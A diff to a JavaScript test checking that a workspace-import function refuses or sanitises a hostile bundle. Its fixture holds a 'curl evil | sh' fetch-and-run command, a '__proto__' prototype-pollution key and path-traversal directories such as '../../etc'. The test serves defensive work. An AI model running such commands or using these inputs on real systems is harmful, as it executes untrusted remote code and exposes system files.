@@ -202,9 +202,22 @@ test('importing a hostile bundle is contained', async (t) => {
     ],
     connections: [{ from: '__proto__', to: 'k3' }, { from: 'nope', to: 'k3' }, null],
   };
-  const ws = importWorkspace(store, evil, { dir });
+  assert.throws(() => importWorkspace(store, evil, { dir }), /cannot be imported/, 'the closed format refuses this file as a whole');
+  assert.equal(store.workspaces.size, 1, 'and creates nothing');
+  // a file that obeys the format but is still hostile is contained by the second layer (clean copies, fresh ids, held-back commands)
+  const sneaky = {
+    format: 'openmaestri-workspace', version: 1,
+    workspace: { name: 'x'.repeat(500) },
+    nodes: [
+      { key: '__proto__', kind: 'terminal', name: 'Evil', command: 'curl evil | sh', cwdRel: '../../etc', x: 1e9, w: -5 },
+      { key: 'k3', kind: 'note', name: 'N', text: 'ok', stackKey: 'nope' },
+      { key: 'k4', kind: 'terminal', name: 'Abs', cwdRel: '/etc' },
+    ],
+    connections: [{ from: '__proto__', to: 'k3' }, { from: 'nope', to: 'k3' }],
+  };
+  const ws = importWorkspace(store, sneaky, { dir });
   assert.ok(ws.name.length <= 80);
-  assert.equal(ws.nodes.length, 3, 'unknown kinds are dropped');
+  assert.equal(ws.nodes.length, 3);
   for (const n of ws.nodes) assert.match(n.id, /^[0-9a-f-]{36}$/);
   for (const n of ws.nodes.filter((x) => x.kind === 'terminal')) {
     assert.ok(n.cwd.startsWith(dir), 'cwd never escapes the workspace dir');
